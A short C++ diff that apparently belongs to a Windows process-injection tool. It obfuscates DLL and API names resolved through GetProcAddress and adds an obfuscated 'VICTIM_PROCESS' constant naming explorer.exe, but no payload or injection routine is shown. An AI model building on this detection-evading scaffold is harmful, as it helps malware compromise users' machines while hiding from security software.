@@ -22,5 +22,12 @@
 
 #define RESOLVE(dll_name, function_name) reinterpret_cast<decltype(::function_name)*>(GetProcAddress(LoadLibraryA(OBFUSCATE(#dll_name).c_str()), OBFUSCATE(#function_name).c_str()))
 
-using ByteVector = std::vector<uint8_t>;
+using Byte = uint8_t;
+using ByteVector = std::vector<Byte>;
 using Address64 = uint64_t;
+using Pid = uint32_t;
+using Tid = uint32_t;
+
+static const std::wstring VICTIM_PROCESS = WOBFUSCATE(L"explorer.exe");
+
+static constexpr size_t PAGE_SIZE = 0x1000;
